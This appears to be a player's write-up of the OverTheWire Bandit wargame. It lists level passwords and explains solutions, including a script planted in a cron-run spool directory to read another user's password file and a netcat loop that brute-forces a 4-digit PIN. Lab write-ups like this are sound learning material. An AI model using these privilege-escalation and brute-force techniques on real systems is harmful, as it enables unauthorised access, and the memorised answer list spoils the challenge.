#Bandit Write-ups

SSH information `bandit.labs.overthewire.org -p 2220`

###bandit2
	 CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
###bandit3
	UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
###bandit4
	pIwrPrtPN36QITSp3EQaw936yaFoFgAB
###bandit5
###bandit6  
	DXjZPULLxYr17uwoI01bNLQbtFemEgo7
###bandit7
	HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
###bandit8
	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
###bandit9
	UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
###bandit10
	truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
###bandit11
	IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
###bandit12
	5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
###bandit13
	8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
###bandit14
	4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
###bandit15
	BfMYroe26WYalil77FoDi9qh59eK5xNr
###bandit16
	cluFn7wTiGryunymYOu4RcffSxQluehd
###bandit17
	see bandit17.txt 
###bandit18
	kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
###bandit19
	IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
solved with `ssh bandit18@bandit.labs.overthewire.org -p 2220 'bash -s' < banditscript.sh `
###bandit20
	GbKksEFF4yrVs6il55v6gwY5aVje5f0j
###bandit21
	gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
###bandit22
	Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
###bandit23
	jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
###bandit24
	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 
We discover a cronjob running which executes and then deletes everything in /var/spool/bandit24 every 60 seconds
```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done
```
The challenge gives us some hints that we need to create a shell script so I create a working directory `mkdir /tmp/droogy/`

Create a executable script and empty text file our script will point towards
` touch evilscript.sh password.txt && chmod 777 ./*`

Next write the script which will populate the password file with the password for bandit24
```bash

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/droogy/password.txt

```
Now we wait (or keep spamming lol) and cat our password file
	
>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 

###bandit24
>uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

This one was a bit tricky. 
We are given the information that a network daemon is listening on port 30002
and waiting to receive both the current password and a 4 digit pin. 
We are told explicitly we are going to need to to bruteforce this pin 
so I create a working directory and start working on a script.
```bash
#!/bin/bash
pwd=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
for i in {9999..0000}; do
	echo "$pwd $i"
done > brute.txt;
cat brute.txt | nc localhost 30002
```
This final script definitely needs some refining but showcases the flexibility of shell scripting.





 